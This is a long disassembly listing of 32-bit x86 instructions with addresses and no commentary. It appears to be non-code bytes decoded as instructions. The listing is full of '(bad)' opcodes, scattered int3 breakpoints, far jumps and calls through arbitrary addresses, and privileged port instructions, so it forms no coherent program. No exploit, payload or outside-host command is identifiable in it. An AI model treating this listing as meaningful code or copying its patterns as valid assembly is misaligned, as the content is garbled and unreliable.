  4194e1:	inc    DWORD PTR [ebx-0x2b000040]
  4194e7:	push   edi
  4194e8:	cmp    edi,0xffffffcc
  4194eb:	sub    BYTE PTR ds:0xb0d8cc91,cl
  4194f1:	add    ah,cl
  4194f3:	cli    
  4194f4:	inc    DWORD PTR [eax]
  4194f6:	inc    edi
  4194f7:	mov    ebp,0x3dff00cc
  4194fc:	aas    
  4194fd:	xchg   esp,eax
  4194fe:	add    bl,bh
  419500:	push   ecx
  419501:	inc    DWORD PTR [eax]
  419503:	sub    BYTE PTR [ebx-0x33682a01],al
  419509:	add    BYTE PTR [eax],al
  41950b:	psadbw mm0,QWORD PTR [ebx+0x0]
  41950f:	call   DWORD PTR [edi-0x1]
  419512:	sbb    DWORD PTR [eax+eax*1-0x1],0x67
  419517:	aad    0xff
  419519:	add    bh,bh
  41951b:	mov    dh,0x34
  41951d:	sub    bh,bh
  41951f:	pop    esp
  419520:	inc    DWORD PTR [eax]
  419522:	call   DWORD PTR [eax-0x1]
  419525:	int3   
  419526:	dec    esi
  419527:	add    edi,edi
  419529:	(bad)  
  41952a:	(bad)  
  41952b:	cmp    eax,0x5d8913e6
  419530:	or     eax,0xff8a8300
  419535:	sbb    DWORD PTR [ecx],0x37
  419538:	(bad)  
  419539:	(bad)  
  41953a:	call   FWORD PTR [ecx]
  41953c:	inc    ebx
  41953d:	dec    ecx
  41953e:	add    BYTE PTR ds:0x82ff007a,cl
  419544:	(bad)  
  419545:	(bad)  
  419546:	mov    eax,0x89ff007a
  41954b:	push   es
  41954c:	mov    ?,edi
  41954e:	int3   
  41954f:	out    dx,al
  419550:	es (bad) 
  419552:	push   DWORD PTR ds:0x4904ff89
  419558:	(bad)  
  419559:	(bad)  
  41955a:	jmp    FWORD PTR [esi-0x63ffc7f6]
  419560:	sti    
  419561:	inc    DWORD PTR [eax]
  419563:	add    al,0xcc
  419565:	add    bh,bl
  419567:	jmp    0x419569
  419569:	add    bh,bh
  41956b:	jg     0x41958f
  41956d:	aam    0x83
  41956f:	dec    esi
  419570:	rol    DWORD PTR [eax],1
  419572:	sub    DWORD PTR [edx-0x77],0x0
  419576:	sub    al,0x92
  419578:	inc    DWORD PTR [eax]
  41957a:	call   ebp
  41957c:	mov    WORD PTR [ebx+0xdb18ff],es
  419582:	inc    DWORD PTR [edx-0x1]
  419585:	push   DWORD PTR ds:0xffcc83f6
  41958b:	and    eax,0xf0ff6559
  419590:	inc    eax
  419591:	(bad)  
  419592:	dec    DWORD PTR [edi+edi*8-0x77]
  419596:	pop    es
  419597:	xchg   ebx,eax
  419598:	(bad)  
  419599:	(bad)  
  41959a:	jmp    esi
  41959c:	xor    al,0xae
  41959e:	(bad)  
  41959f:	mov    ebp,0x66ffffed
  4195a4:	int3   
  4195a5:	int3   
  4195a6:	cmc    
  4195a7:	arpl   di,di
  4195a9:	inc    DWORD PTR [eax]
  4195ab:	push   edx
  4195ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195ad:	dec    DWORD PTR cs:[edx]
  4195b0:	out    0x0,eax
  4195b2:	add    BYTE PTR ds:0x89ff0000,cl
  4195b8:	add    DWORD PTR [eax],0xffffff89
  4195bb:	mov    BYTE PTR [edi-0x3f],bl
  4195be:	adc    ebp,0x25
  4195c1:	inc    DWORD PTR [eax]
  4195c3:	and    bh,bh
  4195c5:	(bad)  
  4195c6:	out    dx,al
  4195c7:	repz int3 
  4195c9:	add    BYTE PTR [ebx+0xcf3c32],al
  4195cf:	xor    ebp,ecx
  4195d1:	inc    DWORD PTR [ebx+0x3dff009d]
  4195d7:	mov    eax,0x8bffff89
  4195dc:	mov    ch,0xf
  4195de:	call   DWORD PTR [ebx*1+0x39ffcc]
  4195e5:	int3   
  4195e6:	sbb    eax,0xff00cce1
  4195eb:	jge    0x419647
  4195ed:	std    
  4195ee:	add    BYTE PTR [edx-0x600ff28],cl
  4195f4:	mov    edi,edi
  4195f6:	bound  esp,QWORD PTR [edi+edi*8]
  4195f9:	mov    edi,edi
  4195fb:	inc    ebp
  4195fc:	outs   dx,BYTE PTR ds:[esi]
  4195fd:	aad    0x83
  4195ff:	iret   
  419600:	in     al,0x0
  419602:	(bad)  
  419603:	js     0x419604
  419605:	push   DWORD PTR [ecx+esi*2+0x76ffff83]
  41960c:	in     eax,0x3c
  41960e:	cmp    esp,0xffffffb7
  419611:	cmp    edi,0xffffffe7
  419614:	(bad)  
  419615:	call   DWORD PTR [esp+ebp*1+0x0]
  419619:	cmp    edi,0x18
  41961c:	psrld  mm1,QWORD PTR [ecx-0x7633ba4b]
  419623:	adc    edi,edi
  419625:	jmp    DWORD PTR [ecx]
  419627:	retf   0x0
  41962a:	int3   
  41962b:	out    0x3a,al
  41962d:	mov    DWORD PTR [ecx-0xa574],ecx
  419633:	aaa    
  419634:	add    BYTE PTR [ecx-0x3333dc1a],cl
  41963a:	add    BYTE PTR [ebx],dl
  41963c:	cmc    
  41963d:	add    eax,0xcc156000
  419642:	mov    edx,ecx
  419644:	inc    DWORD PTR [eax]
  419646:	and    al,0xe0
  419648:	(bad)  
  419649:	dec    esp
  41964b:	out    dx,al
  41964c:	xchg   ebx,eax
  41964d:	xor    eax,0x1b65cc
  419652:	inc    DWORD PTR [eax+0x70d2ff00]
  419658:	add    bh,bh
  41965a:	int3   
  41965b:	push   esp
  41965c:	div    BYTE PTR [ebx-0x8a5401]
  419662:	(bad)  
  419663:	(bad)  
  419664:	inc    DWORD PTR [ebx+0x838a98]
  41966a:	call   FWORD PTR [esi+0x47]
  41966d:	mov    cl,0xff
  41966f:	cmc    
  419670:	int3   
  419671:	add    BYTE PTR [eax],al
  419673:	or     bh,bh
  419675:	int3   
  419676:	fmul   QWORD PTR [ebp-0x9ff0100]
  41967c:	mov    al,0xb7
  41967e:	add    BYTE PTR [eax],ch
  419680:	mov    bh,0x89
  419682:	int3   
  419683:	or     BYTE PTR [eax],al
  419685:	dec    esp
  419687:	lahf   
  419688:	dec    esp
  41968a:	(bad)  
  41968b:	fmul   QWORD PTR [esi]
  41968d:	stos   DWORD PTR es:[edi],eax
  41968e:	dec    eax
  419690:	jle    0x419691
  419692:	add    BYTE PTR [esi-0x39fd0100],dl
  419698:	cmp    edi,0xffffffff
  41969b:	sbb    al,dl
  41969d:	in     eax,0x0
  41969f:	mov    edx,0xb2ffff91
  4196a4:	int3   
  4196a5:	jmp    ecx
  4196a7:	inc    eax
  4196a8:	(bad)  
  4196a9:	inc    DWORD PTR [eax]
  4196ab:	jns    0x4196eb
  4196ad:	js     0x4196ae
  4196af:	sti    
  4196b0:	pop    ecx
  4196b1:	cmp    edi,0xffffff99
  4196b4:	add    BYTE PTR [eax],al
  4196b6:	inc    ebx
  4196b7:	pusha  
  4196b8:	dec    DWORD PTR [ecx-0x7aaf7a00]
  4196be:	jmp    DWORD PTR [ebx-0x64]
  4196c1:	(bad)  
  4196c2:	inc    DWORD PTR [eax-0x1]
  4196c5:	dec    DWORD PTR [ebp-0x1d]
  4196cb:	popf   
  4196cc:	sub    DWORD PTR [ebp-0x1],esp
  4196cf:	push   es
  4196d0:	icebp  
  4196d1:	(bad)  
  4196d2:	push   DWORD PTR [ebx-0x1]
  4196d5:	call   ebp
  4196d7:	popa   
  4196d8:	mov    DWORD PTR [ebx-0x3d98bc00],eax
  4196de:	add    dl,bl
  4196e0:	mov    bh,0xff
  4196e2:	add    BYTE PTR [esi+0x0],dl
  4196e5:	jmp    FWORD PTR [eax]
  4196e7:	mov    DWORD PTR [eax],eax
  4196e9:	add    BYTE PTR [ebx-0x7c1ba551],al
  4196ef:	stos   BYTE PTR es:[edi],al
  4196f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196f1:	int3   
  4196f2:	sub    ecx,0x0
  4196f5:	dec    DWORD PTR [esi]
  4196f7:	out    dx,al
  4196f8:	int3   
  4196f9:	mov    esp,ecx
  4196fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196fc:	xchg   ebp,eax
  4196fd:	mov    bl,0x0
  4196ff:	mov    dh,0xb0
  419701:	inc    DWORD PTR [eax]
  419703:	jno    0x419705
  419705:	dec    DWORD PTR [edi]
  419707:	sub    al,0xff
  419709:	cmp    edi,0xffffffd4
  41970c:	inc    ebp
  41970d:	sar    bh,0x41
  419710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419711:	add    BYTE PTR [eax],al
  419713:	or     esp,0xffffffcc
  419716:	adc    eax,DWORD PTR cs:[ebx+0x33c20000]
  41971d:	sti    
  41971e:	mov    DWORD PTR [ebx-0x63],eax
  419721:	inc    DWORD PTR [ebx-0x44003308]
  419727:	call   0xeede:0x79ffccff
  41972e:	add    dh,ch
  419730:	cmp    edi,0x0
  419733:	ins    DWORD PTR es:[edi],dx
  419734:	inc    DWORD PTR [ebx-0x8a7a]
  41973a:	add    BYTE PTR [eax+0x55890f97],dh
  419740:	add    ah,cl
  419742:	add    BYTE PTR [ebp+0x797fffff],dl
  419748:	add    BYTE PTR [eax],al
  41974a:	add    BYTE PTR [edi],ch
  41974c:	jmp    FWORD PTR [ecx]
  41974e:	add    bl,dl
  419750:	fild   DWORD PTR [eax]
  419752:	cmp    DWORD PTR [esp+ecx*8-0xec5000],0xffffffcc
  41975a:	int3   
  41975b:	test   eax,0xd9ffd609
  419760:	push   0xff6b83ff
  419765:	add    dl,dh
  419767:	es add bh,bh
  41976a:	jmp    edx
  41976c:	cli    
  41976d:	adc    edi,edi
  41976f:	in     al,0xe8
  419771:	mov    edi,edi
  419773:	mov    edi,?
  419775:	mov    DWORD PTR [eax-0x38],ecx
  419778:	dec    esp
  41977a:	inc    DWORD PTR [ecx]
  41977c:	lds    edx,FWORD PTR [ebx]
  41977e:	add    BYTE PTR [esi-0x63ff005e],ah
  419784:	int3   
  419785:	add    BYTE PTR [ecx+0xffff74],dl
  41978b:	repz leave 
  41978d:	mov    esp,0x895073ff
  419792:	int3   
  419793:	aad    0xff
  419795:	push   DWORD PTR [ecx+0x83cca2]
  41979b:	mov    esp,0x8700984d
  4197a0:	adc    al,0x83
  4197a2:	dec    DWORD PTR [edx]
  4197a4:	add    ah,cl
  4197a6:	push   ecx
  4197a7:	popa   
  4197a8:	(bad)  
  4197a9:	inc    DWORD PTR [ebx+0xb2150]
  4197af:	pop    ecx
  4197b0:	pusha  
  4197b1:	add    BYTE PTR [eax],al
  4197b3:	cli    
  4197b4:	add    BYTE PTR [ecx+0x3f23],cl
  4197ba:	add    BYTE PTR [edx+ebx*4+0x75],dl
  4197be:	jmp    FWORD PTR [edi-0x4cff0009]
  4197c4:	inc    DWORD PTR [eax]
  4197c6:	fcmovb st,st(5)
  4197c8:	add    BYTE PTR [ecx+0x2d27ff00],cl
  4197ce:	add    BYTE PTR [ecx+eiz*2+0x0],cl
  4197d2:	adc    eax,0xffffffcc
  4197d5:	add    BYTE PTR [ecx+eax*2-0x6100ff7d],bl
  4197dc:	sti    
  4197dd:	pop    eax
  4197de:	add    BYTE PTR [edi-0x4b00002e],dh
  4197e4:	or     esp,0xffffffa0
  4197e7:	and    edi,edi
  4197e9:	add    DWORD PTR [eax],0x1b
  4197ec:	push   ds
  4197ed:	int    0xff
  4197ef:	lods   eax,DWORD PTR ds:[esi]
  4197f0:	out    dx,al
  4197f1:	cmp    edi,0x16
  4197f4:	inc    DWORD PTR [eax]
  4197f6:	fcomp  QWORD PTR [ecx-0x2b7c767d]
  4197fc:	addr16 je 0x4197fe
  4197ff:	inc    edi
  419800:	jb     0x41978b
  419802:	(bad)  
  419803:	jle    0x419805
  419805:	jmp    FWORD PTR [edi+0xffb7]
  41980b:	arpl   WORD PTR [ebp+0x2b2f0083],bp
  419811:	(bad)  
  419812:	jmp    esi
  419814:	add    bh,bh
  419816:	or     al,0xfd
  419818:	add    bh,bh
  41981a:	int3   
  41981b:	lahf   
  41981c:	nop
  41981d:	fadd   QWORD PTR [ebx-0x95f8]
  419823:	(bad)  
  419824:	int3   
  419825:	dec    DWORD PTR [edi]
  419827:	xchg   bh,bh
  419829:	add    BYTE PTR [eax],al
  41982b:	or     ch,ch
  41982d:	sar    edi,1
  41982f:	push   ecx
  419830:	imul   edi,edi,0xffffffff
  419833:	fcmovne st,st(4)
  419835:	int3   
  419836:	fs mov ?,edi
  419839:	int3   
  41983a:	or     DWORD PTR [ebx+0x21ff1df9],0x59
  419841:	(bad)  
  419842:	push   DWORD PTR [edi]
  419844:	add    bh,bh
  419846:	es cmp eax,0xdf0000ff
  41984c:	dec    ebp
  41984d:	arpl   WORD PTR [eax],ax
  41984f:	inc    edx
  419850:	cmp    eax,0x1ff89
  419855:	add    BYTE PTR [ebx+0x60],dh
  419858:	(bad)  
  419859:	(bad)  
  41985a:	dec    DWORD PTR [edi+esi*1+0x53]
  41985e:	add    dl,al
  419860:	(bad)  
  419861:	inc    DWORD PTR [ebx-0x1800009a]
  419867:	inc    DWORD PTR gs:[eax]
  41986a:	call   FWORD PTR [esi-0x30]
  41986d:	pop    esp
  41986e:	add    BYTE PTR [eax+edi*1],ch
  419871:	add    DWORD PTR [ebx+0x8ffff94],0x68
  419878:	(bad)  
  419879:	(bad)  
  41987a:	call   DWORD PTR [edx+eax*8+0x234c0078]
  419881:	dec    DWORD PTR [ecx-0x32ff33ab]
  419887:	inc    esi
  419888:	add    ah,cl
  41988a:	(bad)  
  41988b:	fst    DWORD PTR [edi+0x5a]
  41988e:	inc    DWORD PTR [ecx-0x40003383]
  419894:	(bad)  
  419895:	push   DWORD PTR [ecx+ebx*2]
  419898:	add    bh,bh
  41989a:	push   DWORD PTR [ebp+ebp*4-0x2d]
  41989e:	jmp    DWORD PTR [edi-0x69]
  4198a1:	add    BYTE PTR [ecx-0x27ff003c],cl
  4198a7:	clc    
  4198a8:	inc    DWORD PTR [ebx+0x7edd80ff]
  4198ae:	jmp    FWORD PTR [ecx+0x1cffffc9]
  4198b4:	inc    DWORD PTR [ebx-0x7c00da63]
  4198ba:	add    BYTE PTR [esi+0x6e],al
  4198bd:	(bad)  
  4198c0:	sub    eax,0xff1a8900
  4198c5:	call   FWORD PTR [esi+0x1b]
  4198c8:	mov    DWORD PTR [eax],eax
  4198ca:	add    BYTE PTR [ecx+0x71ff184a],dh
  4198d0:	cli    
  4198d1:	(bad)  
  4198d2:	inc    esi
  4198d4:	int3   
  4198d5:	push   DWORD PTR [edx+0x3e]
  4198d8:	inc    DWORD PTR [ebx-0x2a19d200]
  4198de:	int3   
  4198df:	lock adc bh,bh
  4198e2:	(bad)  
  4198e3:	call   0x503e98e7
  4198e8:	add    BYTE PTR [eax],al
  4198ea:	add    ch,al
  4198ec:	push   es
  4198ed:	lods   al,BYTE PTR ds:[esi]
  4198ee:	add    BYTE PTR [ebx+0x59ff89f8],al
  4198f4:	add    DWORD PTR [ebx-0x337cd552],0xffffffff
  4198fb:	daa    
  4198fc:	cwde   
  4198fd:	mov    al,0xff
  4198ff:	push   ebx
  419900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419901:	add    bh,bh
  419903:	add    al,BYTE PTR [eax]
  419905:	call   DWORD PTR [edx+ebp*1]
  419908:	add    BYTE PTR [eax],al
  41990a:	mov    DWORD PTR [edi],eax
  41990c:	and    al,0x8
  41990e:	add    BYTE PTR [eax+0x658300bf],bl
  419914:	int3   
  419915:	add    BYTE PTR [eax],bh
  419917:	clc    
  419918:	add    BYTE PTR [ebx-0x3d6d0600],al
  41991e:	sbb    edi,0x57
  419921:	inc    DWORD PTR [eax]
  419923:	and    bh,bh
  419925:	and    edx,0x6a
  419928:	inc    DWORD PTR [eax]
  41992a:	int3   
  41992b:	ja     0x4198b9
  41992d:	inc    BYTE PTR [eax]
  41992f:	pusha  
  419930:	adc    edi,edi
  419932:	mov    edx,eax
  419934:	(bad)  
  419935:	(bad)  
  419936:	ds xor esp,ecx
  419939:	inc    DWORD PTR [eax]
  41993b:	sbb    BYTE PTR [esi-0x1a],bl
  41993e:	add    BYTE PTR [esi],ch
  419940:	pop    ecx
  419941:	inc    DWORD PTR [eax]
  419943:	push   edi
  419944:	add    BYTE PTR [ebx-0x7cff428e],al
  41994a:	(bad)  
  41994b:	sti    
  41994c:	por    mm7,mm7
  41994f:	mov    ebx,0x1cffff6f
  419954:	cmp    edi,0xfffffff0
  419957:	(bad)  
  419959:	cmp    edi,0x42
  41995c:	or     eax,0xaf1900a2
  419961:	cmp    edi,0x1c
  419964:	int3   
  419965:	add    BYTE PTR [ecx-0x767ca0],ch
  41996b:	sbb    esp,DWORD PTR [edi+0x5c0500b0]
  419971:	add    bh,bh
  419973:	gs or  esp,0x2
  419977:	adc    BYTE PTR [ecx+0x5e900ff],cl
  41997d:	outs   dx,BYTE PTR ds:[esi]
  41997e:	mov    ebx,ebx
  419980:	iret   
  419981:	inc    DWORD PTR [eax]
  419983:	mov    al,ds:0xcedbff89
  419988:	(bad)  
  419989:	inc    DWORD PTR [ebx+0xbe1fb7]
  41998f:	fistp  DWORD PTR ds:0x839b00cc
  419995:	add    dh,bl
  419997:	add    BYTE PTR [eax],0x0
  41999a:	add    ah,al
  41999c:	sahf   
  41999d:	jecxz  0x419928
  41999f:	add    al,0x69
  4199a1:	int3   
  4199a2:	call   FWORD PTR [edx+0x6d9cffff]
  4199a8:	(bad)  
  4199a9:	(bad)  
  4199aa:	inc    ebp
  4199ac:	lock bound eax,QWORD PTR [ebx-0x762594]
  4199b3:	add    DWORD PTR [eax],0xcc3d0aff
  4199b9:	add    DWORD PTR [eax],0xfffffff7
  4199bc:	mov    dh,0x79
  4199be:	dec    DWORD PTR [ecx-0x41]
  4199c1:	(bad)  
  4199c2:	(bad)  
  4199c3:	fdivp  st(7),st
  4199c5:	push   DWORD PTR [edx-0x6c]
  4199c8:	add    bh,bh
  4199ca:	(bad)  
  4199cb:	in     eax,dx
  4199cc:	cmp    BYTE PTR [ebx+eax*4+0x6b],dh
  4199d0:	lock add bh,bh
  4199d3:	dec    ebx
  4199d4:	dec    DWORD PTR [ecx+0xf543]
  4199da:	dec    DWORD PTR [ecx]
  4199dc:	enter  0xff3d,0x61
  4199e0:	xchg   edi,edi
  4199e2:	add    DWORD PTR [ebx+0x0],0x0
  4199e6:	data16 jge 0x4199e8
  4199e9:	add    DWORD PTR [eax],0x4e
  4199ec:	sub    BYTE PTR [esi+0x0],cl
  4199ef:	inc    eax
  4199f0:	xchg   bh,bh
  4199f2:	push   DWORD PTR [edx-0x12280000]
  4199f8:	int3   
  4199f9:	add    DWORD PTR [ebx-0x76cbd8b7],0x5c
  419a00:	push   ss
  419a01:	dec    esp
  419a03:	mov    eax,DWORD PTR [eax]
  419a05:	add    BYTE PTR [edx-0x3e],cl
  419a08:	int3   
  419a09:	(bad)  
  419a0a:	inc    DWORD PTR [edi-0x33]
  419a0d:	popf   
  419a0e:	(bad)  
  419a0f:	cmp    esi,DWORD PTR [eax+eax*1-0x934]
  419a16:	arpl   si,sp
  419a18:	cmp    edi,0xffffff83
  419a1b:	mov    bh,0x1
  419a1d:	nop
  419a1e:	inc    edx
  419a20:	or     bh,bh
  419a22:	push   DWORD PTR [eax+eax*1]
  419a25:	jmp    FWORD PTR [ebp+ebp*2+0x0]
  419a29:	(bad)  
  419a2a:	call   DWORD PTR [ebx+0x5383d569]
  419a30:	inc    ebx
  419a31:	add    bh,bh
  419a33:	xchg   ebx,eax
  419a34:	int3   
  419a35:	add    BYTE PTR [ecx+0xc],al
  419a38:	dec    DWORD PTR [ecx+0x1c80cf00]
  419a3e:	(bad)  
  419a3f:	fld    st(1)
  419a41:	mov    DWORD PTR [ebx-0x167c00c3],eax
  419a47:	gs (bad) 
  419a49:	inc    DWORD PTR [eax]
  419a4b:	rcl    DWORD PTR [ebx+0x4e70830f],0x0
  419a52:	call   DWORD PTR ds:0x5f1e8300
  419a58:	int3   
  419a59:	inc    DWORD PTR [eax]
  419a5b:	mov    dh,0xab
  419a5d:	mov    ch,0xff
  419a5f:	add    edx,DWORD PTR [eax-0x76a40000]
  419a65:	call   FWORD PTR [ebp+ecx*2-0x66ff007d]
  419a6c:	scas   al,BYTE PTR es:[edi]
  419a6d:	retf   
  419a6e:	inc    DWORD PTR [ebx-0x5f007cfe]
  419a74:	cmp    edi,0x53
  419a77:	je     0x419a78
  419a79:	inc    DWORD PTR [eax]
  419a7b:	xor    esp,DWORD PTR [esi-0x4d]
  419a7e:	add    BYTE PTR [edx],cl
  419a80:	xor    eax,0xc8989
  419a85:	add    BYTE PTR [edx+0xff00f6],dl
  419a8b:	call   0xb6419646
  419a90:	push   es
  419a91:	int3   
  419a92:	int3   
  419a93:	fiadd  WORD PTR [ebx-0x76956f01]
  419a99:	add    bh,bh
  419a9b:	pop    ebp
  419a9c:	mov    dl,BYTE PTR [edi+0x0]
  419a9f:	add    eax,0x84ff0069
  419aa4:	mov    DWORD PTR [eax],eax
  419aa6:	adc    eax,0xff833a
  419aab:	in     eax,dx
  419aac:	mov    gs,WORD PTR [edx-0x7d]
  419aaf:	cmp    dl,bl
  419ab1:	add    bh,bh
  419ab3:	push   0x390dccff
  419ab8:	inc    DWORD PTR [eax]
  419aba:	cmp    DWORD PTR [esi],0xffffff9f
  419abd:	sub    bh,bh
  419abf:	sub    DWORD PTR [ecx-0x7c5f3400],0x0
  419ac6:	xor    al,BYTE PTR [ebp-0x34]
  419ac9:	(bad)  
  419aca:	push   ebx
  419acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419acd:	repz (bad) 
  419acf:	cmp    al,0xd8
  419ad1:	add    DWORD PTR [eax],0xffffff93
  419ad4:	add    bh,bh
  419ad6:	jno    0x419a98
  419ad8:	add    BYTE PTR [eax],al
  419ada:	dec    ebp
  419adc:	add    BYTE PTR [edi+0x1b49ff],bl
  419ae2:	push   DWORD PTR [edi+edi*8-0x77]
  419ae6:	call   FWORD PTR [eax+eax*1]
  419ae9:	mov    DWORD PTR [ebx-0x762d9337],eax
  419aef:	les    esi,FWORD PTR [edx]
  419af1:	add    bh,bh
  419af3:	pop    ss
  419af4:	add    BYTE PTR [eax],al
  419af6:	pop    ebp
  419af7:	clc    
  419af8:	mov    edi,edi
  419afa:	add    BYTE PTR [esi],ch
  419afc:	stos   DWORD PTR es:[edi],eax
  419afd:	leave  
  419afe:	dec    DWORD PTR [edx-0x33fffff5]
  419b04:	inc    DWORD PTR [eax]
  419b06:	push   edx
  419b07:	cmp    edi,0xffffff83
  419b0a:	inc    DWORD PTR [edi]
  419b0c:	je     0x419b03
  419b0e:	add    BYTE PTR [esp+edx*8],ch
  419b11:	(bad)  
  419b12:	jmp    FWORD PTR [ebx]
  419b14:	(bad)  
  419b15:	push   ebp
  419b17:	mov    ebp,0xaeff8900
  419b1c:	dec    edx
  419b1d:	popa   
  419b1e:	inc    DWORD PTR [edi+0x6d]
  419b21:	inc    DWORD PTR [eax]
  419b23:	adc    ecx,esp
  419b25:	add    BYTE PTR [esi],bh
  419b27:	xchg   ebp,eax
  419b28:	add    BYTE PTR [eax],al
  419b2a:	call   DWORD PTR [eax]
  419b2c:	sbb    al,0x74
  419b2e:	add    bl,al
  419b30:	in     eax,0x89
  419b32:	jmp    DWORD PTR [ebx]
  419b34:	int3   
  419b35:	mov    esi,ecx
  419b37:	push   eax
  419b38:	add    ah,cl
  419b3a:	add    BYTE PTR [edi+0x6200c11a],ch
  419b40:	adc    eax,DWORD PTR [ebx+0xb6ff]
  419b46:	xchg   esp,eax
  419b47:	popf   
  419b48:	inc    DWORD PTR [eax]
  419b4a:	jmp    FWORD PTR [ecx+0x53005424]
  419b50:	in     al,dx
  419b51:	add    bh,bh
  419b53:	push   edx
  419b54:	int3   
  419b55:	xor    DWORD PTR [esi],0x4
  419b58:	cmp    edi,0x0
  419b5b:	popa   
  419b5c:	and    ch,BYTE PTR [ebx-0x7f1001]
  419b62:	inc    edi
  419b64:	inc    DWORD PTR [eax]
  419b66:	imul   ecx,edi,0x19ffff00
  419b6c:	mov    ch,0xf8
  419b6e:	inc    DWORD PTR [edx+0x70ffff35]
  419b74:	(bad)  
  419b75:	inc    DWORD PTR [ebx-0x50]
  419b78:	add    bh,bh
  419b7a:	dec    DWORD PTR [esi]
  419b7c:	pushf  
  419b7d:	xchg   edi,eax
  419b7e:	dec    edi
  419b80:	lods   al,BYTE PTR ds:[esi]
  419b81:	add    ah,cl
  419b83:	aaa    
  419b84:	int3   
  419b85:	add    BYTE PTR [esi],ch
  419b87:	sbb    DWORD PTR [eax],eax
  419b89:	add    BYTE PTR [eax],al
  419b8b:	pop    ss
  419b8c:	jne    0x419b21
  419b8e:	sbb    DWORD PTR [edi-0x76],0xffffffcc
  419b92:	add    dh,al
  419b94:	(bad)  
  419b95:	inc    DWORD PTR [eax]
  419b97:	sahf   
  419b98:	(bad)  
  419b99:	dec    DWORD PTR [ecx-0x39ef65]
  419b9f:	mov    ebx,0x97ffff67
  419ba4:	dec    DWORD PTR [ecx-0x7cff947f]
  419baa:	add    al,bl
  419bac:	pop    esi
  419bad:	in     eax,0x83
  419baf:	pop    ecx
  419bb0:	sub    al,BYTE PTR [eax]
  419bb2:	add    dh,bh
  419bb4:	inc    DWORD PTR [ebx-0xff1f29]
  419bba:	jmp    DWORD PTR [ecx+ebp*8+0x31]
  419bbe:	cmp    DWORD PTR [edx-0x49],0x0
  419bc2:	call   FWORD PTR [ebx]
  419bc4:	add    bh,bh
  419bc6:	fisttp WORD PTR [eax]
  419bc8:	or     esp,0xffffffff
  419bcb:	ret    0xadb6
  419bce:	cmp    esp,0x6d
  419bd1:	dec    DWORD PTR [ecx+0x27ff83c4]
  419bd7:	and    bh,bh
  419bd9:	mov    DWORD PTR [eax],eax
  419bdb:	ja     0x419b85
  419bdd:	popf   
  419bde:	dec    DWORD PTR [edi-0x35ff7696]
  419be4:	add    BYTE PTR [eax],al
  419be6:	sbb    al,0xbb
  419be8:	add    bh,bh
  419bea:	mov    DWORD PTR [edx-0x18],ecx
  419bed:	add    DWORD PTR [eax],0x66
  419bf0:	sbb    edi,edi
  419bf2:	add    BYTE PTR [ebx+0xdbbffff],bh
  419bf8:	add    DWORD PTR [eax],0xffffffcc
  419bfb:	mov    esp,0xec006aa6
  419c00:	inc    esp
  419c01:	inc    DWORD PTR [eax]
  419c03:	test   BYTE PTR [eax],0xff
  419c06:	test   DWORD PTR [ecx-0x7d],edx
  419c09:	(bad)  
  419c0a:	inc    DWORD PTR [ebx]
  419c0c:	enter  0xff93,0xf5
  419c10:	pop    esp
  419c11:	inc    DWORD PTR [eax]
  419c13:	cmp    eax,DWORD PTR [eax]
  419c15:	call   DWORD PTR [eax+0xffffcc]
  419c1b:	nop
  419c1c:	mov    esi,0xc9bbffda
  419c21:	int3   
  419c22:	xor    esi,0xffffffff
  419c25:	jmp    FWORD PTR [edi+0xd]
  419c28:	dec    esp
  419c2a:	int3   
  419c2b:	or     al,0x43
  419c2d:	cmp    BYTE PTR [ebx+0xff6395],al
  419c33:	jge    0x419bbe
  419c35:	and    DWORD PTR [esp+edx*8-0x1],0x0
  419c3a:	add    BYTE PTR [esi-0x1a],ch
  419c3d:	cli    
  419c3e:	int3   
  419c3f:	outs   dx,DWORD PTR ds:[si]
  419c41:	inc    DWORD PTR [eax]
  419c43:	mov    dl,0xff
  419c45:	and    DWORD PTR ds:0x898383b0,0x66
  419c4c:	mov    ds:0x4d950054,al
  419c51:	(bad)  
  419c52:	dec    DWORD PTR [eax]
  419c54:	add    bh,bh
  419c56:	inc    edx
  419c57:	and    eax,DWORD PTR [eax]
  419c59:	dec    DWORD PTR [ecx+0x183951]
  419c5f:	adc    BYTE PTR [ecx],0xff
  419c62:	jmp    FWORD PTR [eax-0x1]
  419c65:	jmp    DWORD PTR [edx+eax*1+0x0]
  419c69:	int3   
  419c6a:	call   FWORD PTR [ebx+0x7200e8f9]
  419c70:	inc    DWORD PTR [eax]
  419c72:	int3   
  419c73:	stos   DWORD PTR es:[edi],eax
  419c74:	add    bh,bh
  419c76:	in     al,dx
  419c77:	dec    esi
  419c78:	add    ah,cl
  419c7a:	add    BYTE PTR [edx-0x6e],bh
  419c7d:	loop   0x419c7e
  419c7f:	jns    0x419c64
  419c81:	(bad)  
  419c82:	dec    DWORD PTR [ebp-0x34]
  419c85:	add    BYTE PTR [ecx],dh
  419c87:	xchg   esi,eax
  419c88:	cmp    edi,0xffffffcc
  419c8b:	aaa    
  419c8c:	les    ecx,FWORD PTR [esi+0x0]
  419c8f:	stos   BYTE PTR es:[edi],al
  419c90:	jmp    0xaeff:0xffe989ff
  419c97:	xchg   bh,bh
  419c99:	inc    DWORD PTR [eax]
  419c9b:	imul   ebx,DWORD PTR [ecx-0x62bf009d],0x7fffcc
  419ca5:	add    BYTE PTR [edi],cl
  419ca7:	or     BYTE PTR [ebx+0x22ae89ff],al
  419cad:	popa   
  419cae:	push   esi
  419cb0:	sub    eax,DWORD PTR [eax]
  419cb2:	add    BYTE PTR [edi-0x7d],al
  419cb5:	(bad)  
  419cb6:	mov    edx,0x83000011
  419cbb:	ins    BYTE PTR es:[edi],dx
  419cbc:	das    
  419cbd:	dec    esp
  419cbe:	jmp    FWORD PTR [ebx-0x11]
  419cc1:	(bad)  
  419cc2:	dec    DWORD PTR [ebp+0x0]
  419cc5:	inc    esp
  419cc7:	popa   
  419cc8:	inc    DWORD PTR [eax]
  419cca:	call   FWORD PTR [eax+0x65]
  419ccd:	sbb    eax,0x83330ecc
  419cd2:	call   FWORD PTR [eax+0x5df200ff]
  419cd8:	inc    DWORD PTR [eax]
  419cda:	inc    DWORD PTR [edx-0x66ffc177]
  419ce0:	in     al,dx
  419ce1:	mov    DWORD PTR [eax],eax
  419ce3:	mov    ch,0xff
  419ce5:	jmp    DWORD PTR [edx-0x46]
  419ce8:	(bad)  
